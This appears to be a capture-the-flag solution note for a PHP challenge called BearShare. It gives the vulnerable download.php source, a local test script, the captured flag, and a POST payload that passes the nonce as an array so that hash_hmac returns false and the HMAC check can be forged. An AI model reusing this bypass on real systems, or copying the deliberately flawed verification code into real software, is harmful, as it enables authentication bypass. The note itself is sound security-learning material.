refer -> https://www.securify.nl/blog/spot-the-bug-challenge-2018-warm-up



<?php
  $nonce = [];
  $S_KEY = false;
  $storage = "gimmeflag";
  $hash = "028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769";

  if(isset($nonce)){
    $S_KEY = hash_hmac('sha256',$nonce,$S_KEY);
    echo $S_KEY;
    //echo "merda";

  };
  $final_hash = hash_hmac('sha256',$storage,$S_KEY);
  echo $final_hash;
  if ($final_hash !== $hash){
    echo "noFlag";
  };
  
?>


payload: "nonce[]=&hash=028cf6abf024b107104bc69d844cd3e70755cf2be66b9ab313ca62f9efdcf769&storagesv=gimmeflag&messid="


flag: flag{_l0L_pHp_how_51lly_4re_you!!!}



<?php
include_once 'config.php';
$nonce = md5(rand(10000000, 99999999).rand(10000000, 99999999));

function gen_hash($n, $sv){
	$first = hash_hmac('sha256',$n,$S_KEY);
	return hash_hmac('sha256',$sv,$first);
}

function validate_hash(){
	if(empty($_POST['hash']) || empty($_POST['storagesv'])){
		die('Cannot verify server');
	}
	if(isset($_POST['nonce'])){
		$S_KEY = hash_hmac('sha256',$_POST['nonce'],$S_KEY);

	}
	$final_hash = hash_hmac('sha256',$_POST['storagesv'],$S_KEY);
	if ($final_hash !== $_POST['hash']){
		die('Cannot verify server');
	}

}

function filter($x){
	$x = (string)$x;
	if(preg_match('/http|https|\@|\s|:|\/\//mi',$x)){
		return false;

	}
	return $x;

}


if(isset($_POST['messid'])){

	$messid = $_POST['messid'];
	validate_hash();
	$url="";
	if($_POST['storagesv'] === 'message1.local' or $_POST['storagesv'] === 'message2.local'){
		$url = 'http://'.$_POST['storagesv'].'/';

	} elseif ($_POST['storagesv']==="gimmeflag") {
		die('flag{*******}'); //flag censored for security reasons :)

	}

	$messid = filter($messid);

	if($messid){
		$url .= $messid;
		die('Messages not yet implemented')	

	} else {
		die('Hey, are you a haxor?');

	}

}

?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>BearShare</title>

    <!-- Bootstrap core CSS -->
    <link href="dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <style>
            /* Sticky footer styles
        -------------------------------------------------- */
        html {
        position: relative;
        min-height: 100%;
        }
        body {
        /* Margin bottom by footer height */
        margin-bottom: 60px;
        }
        .footer {
        position: absolute;
        bottom: 0;
        width: 100%;
        /* Set the fixed height of the footer here */
        height: 60px;
        line-height: 60px; /* Vertically center the text there */
        background-color: #f5f5f5;
        }


        /* Custom page CSS
        -------------------------------------------------- */
        /* Not required for template or sticky footer method. */

        body > .container {
        padding: 60px 15px 0;
        }

        .footer > .container {
        padding-right: 15px;
        padding-left: 15px;
        }

        code {
        font-size: 80%;
        }
    </style>
  </head>

  <body>

    <header>
      <!-- Fixed navbar -->
      <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
        <a class="navbar-brand" href="#">BearShare</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item">
              <a class="nav-link" href="index.php">Create message</a>
            </li>
            <li class="nav-item active">
              <a class="nav-link" href="download.php">Get message <span class="sr-only">(current)</span></a>
            </li>
          </ul>
        </div>
      </nav>
    </header>

    <!-- Begin page content -->
    <main role="main" class="container">
    <div class="mt-3">
      <h1>BearShare</h1>
      <h3><i>Private message sharing</i></h3>
    </div>
    <p class="lead">Need a dumb way to share your private message? Use BearShare!</p>
      <?php if(isset($out)){ ?>
      <xmp style="background: #f8f9fa;overflow-x:scroll;padding:10px;max-height:500px">
<?php echo $out; ?>
</xmp>
      <?php } ?>
	<form class="form-signin" method="POST" action="download.php">
		<input type="hidden" name="nonce" value="<?php echo $nonce; ?>"/>
		<input type="hidden" name="hash" value=""/>
		<div class="form-row">
			<div class="form-group col-md-3">
			    <select class="form-control ss" name="storagesv">
			      <option disabled selected value>-- Storage server --</option>
			      <option value="message1.local">message1.local</option>
			      <option value="message2.local">message2.local</option>
			    </select>
			</div>
			<div class="form-group col-md-9">
			    <input type="text" class="form-control" name="messid"/>
			</div>

            <button class="btn btn-lg btn-primary btn-block" style="max-width:300px;margin:auto;margin-top:30px;" type="submit">Read message</button>
        </form>
    </main>

    <footer class="footer">
      <div class="container">
        <span class="text-muted">Content Â© 2018 - AceBear</span>
      </div>
    </footer>

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/vendor/jquery-slim.min.js"><\/script>')</script>
    <script src="assets/js/vendor/popper.min.js"></script>
    <script src="dist/js/bootstrap.min.js"></script>
    <script>
    	$( ".ss" ).change(function() {
		if($(".ss").val() == "message1.local"){
			$("input[name='hash']").val("<?php echo gen_hash($nonce, 'message1.local'); ?>");
		} else if($(".ss").val() == "message2.local"){
			$("input[name='hash']").val("<?php echo gen_hash($nonce, 'message2.local'); ?>");
		} else {
			"None";
		}
	});
    </script>
  </body>
</html>
